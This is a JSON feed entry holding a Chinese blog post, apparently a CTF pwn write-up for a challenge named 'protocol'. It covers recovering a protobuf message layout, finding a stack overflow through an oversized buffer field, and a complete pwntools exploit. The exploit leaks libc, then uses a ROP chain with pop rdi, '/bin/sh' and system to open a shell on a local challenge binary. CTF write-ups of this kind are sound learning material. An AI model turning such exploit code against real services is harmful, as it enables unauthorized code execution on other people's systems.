{
    "version": "https://jsonfeed.org/version/1",
    "title": "null • All posts by \"栈劫持\" tag",
    "description": "欢迎来到Huan的笔记空间~~~~~~🌸",
    "home_page_url": "https://yhuanhuan01.github.io",
    "items": [
        {
            "id": "https://yhuanhuan01.github.io/2024/06/28/protocol%E5%AD%A6%E4%B9%A0/",
            "url": "https://yhuanhuan01.github.io/2024/06/28/protocol%E5%AD%A6%E4%B9%A0/",
            "title": "protocol学习",
            "date_published": "2024-06-28T03:10:40.000Z",
            "content_html": "<h1 id=\"protocol\"><a class=\"markdownIt-Anchor\" href=\"#protocol\">#</a> protocol</h1>\n<blockquote>\n<p>前言：</p>\n<p>华中赛区题目，第一次，由此记录一下</p>\n</blockquote>\n<p>文档：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wcm90b2J1Zi5kZXYvb3ZlcnZpZXcv\">https://protobuf.dev/overview/</span></p>\n<p>如何去还原此结构：</p>\n<p>我的方案如下</p>\n<blockquote>\n<p>git clone <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21hcmluLW0vcGJ0ay5naXQ=\">https://github.com/marin-m/pbtk.git</span></p>\n<p>sudo apt install protobuf-compiler</p>\n</blockquote>\n<p>先进行必要的安装配置</p>\n<p>接下来去生成导入的 py 包</p>\n<blockquote>\n<p>./extractors/from_binary.py ./pwn</p>\n<p>protoc --python_out=. ./filename.proto</p>\n</blockquote>\n<p><img data-src=\"/img/protocol/image-20240628092648137.png\" alt=\"image-20240628092648137\"></p>\n<p>即可得到上面文件</p>\n<h2 id=\"题目启动\"><a class=\"markdownIt-Anchor\" href=\"#题目启动\">#</a> 题目启动</h2>\n<h3 id=\"检查保护\"><a class=\"markdownIt-Anchor\" href=\"#检查保护\">#</a> 检查保护</h3>\n<p><img data-src=\"/img/protocol/image-20240628093304459.png\" alt=\"image-20240628093304459\"></p>\n<p>运行一波程序看看咋样</p>\n<p><img data-src=\"/img/protocol/image-20240628093431819.png\" alt=\"image-20240628093431819\"></p>\n<h3 id=\"测试\"><a class=\"markdownIt-Anchor\" href=\"#测试\">#</a> 测试</h3>\n<p>输入会输出这个，去定位一下</p>\n<p><img data-src=\"/img/protocol/image-20240628093536176.png\" alt=\"image-20240628093536176\"></p>\n<p>if 判断 v5 是否返回 1，返回 0 则会输出 <code>Protobuf Parse Error!</code></p>\n<p><img data-src=\"/img/protocol/image-20240628093750454.png\" alt=\"image-20240628093750454\"></p>\n<p>可以发现，我们 v6 向 s 所在地址去输入，而 v5 所指向的函数应该是检测 s 地址内容的函数</p>\n<p>GPT 解释如下</p>\n<p><code>google::protobuf::MessageLite::ParseFromArray</code>  是 Google Protocol Buffers (protobuf) 库中用于解析二进制数据的方法。它从给定的字节数组中解析数据并将其填充到相应的 protobuf 消息中。</p>\n<p>让我们分解一下这个函数调用：</p>\n<pre><code class=\"language-c++\">google::protobuf::MessageLite::ParseFromArray((google::protobuf::MessageLite *)&amp;unk_209080, s, v6);\n</code></pre>\n<ul>\n<li>\n<p><code>google::protobuf::MessageLite</code>  是一个抽象基类，它定义了所有 protobuf 消息的基本接口和操作。 <code>ParseFromArray</code>  是这个类中的一个成员函数。</p>\n</li>\n<li>\n<p><code>ParseFromArray</code>  函数的签名通常是这样的：</p>\n<pre><code class=\"language-c++\">bool ParseFromArray(const void* data, int size);\n</code></pre>\n<p>它从一个给定大小的字节数组 ( <code>data</code>  开始，大小为  <code>size</code> ) 中解析 protobuf 消息。</p>\n</li>\n<li>\n<p>在这个调用中：</p>\n<ul>\n<li><code>(google::protobuf::MessageLite *)&amp;unk_209080</code>  是一个指向  <code>google::protobuf::MessageLite</code>  派生类实例的指针，表示要将解析得到的数据填充到  <code>unk_209080</code>  对象中。</li>\n<li><code>s</code>  是一个指向字节数组的指针，表示数据来源。</li>\n<li><code>v6</code>  是一个整数，表示字节数组的大小（即  <code>s</code>  的长度）。</li>\n</ul>\n</li>\n</ul>\n<p>换句话说，这个函数调用试图从字节数组  <code>s</code>  中读取  <code>v6</code>  个字节，并将解析得到的消息存储到  <code>unk_209080</code>  对象中。</p>\n<p>如果解析成功， <code>ParseFromArray</code>  将返回  <code>true</code> ；如果失败，则返回  <code>false</code> 。通常情况下，失败的原因可能包括数据格式不正确或数组长度不够等。</p>\n<p>所以如果我们解析失败则不去往下去执行</p>\n<p>unk_209080 填充数据地方只有 1bit 大小空间</p>\n<p><img data-src=\"/img/protocol/image-20240628095136822.png\" alt=\"image-20240628095136822\"></p>\n<p>我们很难进行自己去输入测试</p>\n<p>看下结构体</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>message protoMessage <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    optional string name <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    optional string phoneNumber <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    required <span class=\"token builtin\">bytes</span> <span class=\"token builtin\">buffer</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    required uint32 size <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>optional 可选项</p>\n<p>required 需要写入</p>\n<blockquote>\n<p>封装函数</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">send_payload</span><span class=\"token punctuation\">(</span> buf<span class=\"token punctuation\">,</span> szie<span class=\"token punctuation\">,</span> name <span class=\"token operator\">=</span> <span class=\"token string\">b'name'</span><span class=\"token punctuation\">,</span> phoneNumber <span class=\"token operator\">=</span> <span class=\"token string\">b'phoneNumber'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tpl <span class=\"token operator\">=</span> message_pb2<span class=\"token punctuation\">.</span>protoMessage<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span><span class=\"token builtin\">buffer</span> <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">return</span> pl<span class=\"token punctuation\">.</span>SerializeToString<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> message_pb2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>message protoMessage &#123;</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    optional string name = 1;</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    optional string phoneNumber = 2;</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    required bytes buffer = 3;</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    required uint32 size = 4;</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>&#125;</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">set_payload</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> szie<span class=\"token punctuation\">,</span> name <span class=\"token operator\">=</span> <span class=\"token string\">b'name'</span><span class=\"token punctuation\">,</span> phoneNumber <span class=\"token operator\">=</span> <span class=\"token string\">b'phoneNumber'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tpl <span class=\"token operator\">=</span> message_pb2<span class=\"token punctuation\">.</span>protoMessage<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>phoneNumber <span class=\"token operator\">=</span> phoneNumber</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span><span class=\"token builtin\">buffer</span> <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> size</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token keyword\">return</span> pl<span class=\"token punctuation\">.</span>SerializeToString<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>buf <span class=\"token operator\">=</span> <span class=\"token string\">b'aaaa'</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>size <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>payload <span class=\"token operator\">=</span> set_payload<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/protocol/image-20240628102847682.png\" alt=\"image-20240628102847682\"></p>\n<p>这样我们就可以成功的去执行了</p>\n<h3 id=\"寻找漏洞\"><a class=\"markdownIt-Anchor\" href=\"#寻找漏洞\">#</a> 寻找漏洞</h3>\n<p><img data-src=\"/img/protocol/image-20240628103148873.png\" alt=\"image-20240628103148873\"></p>\n<p>n [0] 是我们输入 buf 的大小，n [1] 是我们输入的内容。而前面可以设置最大为 0x1000 很明显有栈溢出漏洞。</p>\n<p>给出给的 puts 函数的地址，构造合理的 rop 或者 one_gadget（后来发现 one_gadget 没有相应的条件</p>\n<p>完整 exp 如下</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> message_pb2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">set_payload</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> szie<span class=\"token punctuation\">,</span> name <span class=\"token operator\">=</span> <span class=\"token string\">b'name'</span><span class=\"token punctuation\">,</span> phoneNumber <span class=\"token operator\">=</span> <span class=\"token string\">b'phoneNumber'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tpl <span class=\"token operator\">=</span> message_pb2<span class=\"token punctuation\">.</span>protoMessage<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>phoneNumber <span class=\"token operator\">=</span> phoneNumber</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span><span class=\"token builtin\">buffer</span> <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> size</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token keyword\">return</span> pl<span class=\"token punctuation\">.</span>SerializeToString<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tgdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tpause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>message protoMessage &#123;</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    optional string name = 1;</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    optional string phoneNumber = 2;</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    required bytes buffer = 3;</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    required uint32 size = 4;</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&#125;</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Gift: 0x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>puts_libc <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvn<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>libcbase <span class=\"token operator\">=</span> puts_libc <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libcbase<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>system <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>binsh <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rdi <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x000000000002164f</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>ret <span class=\"token operator\">=</span> rdi <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>ogg <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x4f29e</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4f2a5</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4f302</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x10a2fc</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>og <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> ogg<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>buf <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x218</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>size <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>payload <span class=\"token operator\">=</span> set_payload<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "栈劫持",
                "protocol"
            ]
        }
    ]
}